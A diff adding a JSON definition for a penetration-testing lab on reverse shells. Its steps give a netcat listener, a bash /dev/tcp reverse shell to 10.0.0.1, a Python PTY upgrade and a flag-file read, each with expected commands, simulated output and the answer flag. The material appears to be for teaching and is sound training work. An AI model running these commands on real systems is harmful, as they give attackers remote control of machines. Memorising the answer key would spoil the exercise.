@@ -1,0 +1,50 @@
+{
+  "id": "lab_reverse_shell",
+  "title": "Reverse Shell Techniques",
+  "description": "Learn about reverse shells, how they work, and how to detect them in a controlled environment.",
+  "difficulty": "Advanced",
+  "duration": "30 min",
+  "category": "Penetration Testing",
+  "semester_level": 3,
+  "scenario": "You need to establish a reverse shell connection from a compromised server back to your attack machine for command and control.",
+  "environment": "terminal",
+  "tasks": [
+    {
+      "step": 1,
+      "title": "Start Listener",
+      "instruction": "Set up a netcat listener on your attack machine to receive the reverse shell.",
+      "hint": "Use nc with -lvnp flags",
+      "expected_command": "nc -lvnp 4444",
+      "output": "Listening on 0.0.0.0 4444",
+      "explanation": "Listener is ready to receive connections on port 4444."
+    },
+    {
+      "step": 2,
+      "title": "Bash Reverse Shell",
+      "instruction": "Execute a bash reverse shell on the target to connect back to your listener.",
+      "hint": "Use bash with /dev/tcp",
+      "expected_command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+      "output": "Connection received on 10.0.0.50 52341\nbash: cannot set terminal process group (1234): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@target:/$",
+      "explanation": "Reverse shell established! You now have command execution on the target."
+    },
+    {
+      "step": 3,
+      "title": "Upgrade Shell",
+      "instruction": "Upgrade to a fully interactive TTY shell for better functionality.",
+      "hint": "Use Python to spawn a PTY",
+      "expected_command": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
+      "output": "www-data@target:/$ export TERM=xterm\nwww-data@target:/$ ",
+      "explanation": "Shell upgraded! Now you have features like tab completion and can run interactive programs."
+    },
+    {
+      "step": 4,
+      "title": "Persistence Check",
+      "instruction": "Check for the flag that confirms successful reverse shell establishment.",
+      "hint": "Check common flag locations",
+      "expected_command": "cat /var/www/html/.secret_flag",
+      "output": "Congratulations! You have successfully established a reverse shell.\n\nFLAG{ISC_REVERSE_SHELL_EXPERT_2024}\n\nRemember: Always get proper authorization before testing!",
+      "explanation": "Successfully demonstrated reverse shell techniques. These skills are essential for penetration testing.",
+      "flag": "FLAG{ISC_REVERSE_SHELL_EXPERT_2024}"
+    }
+  ]
+}
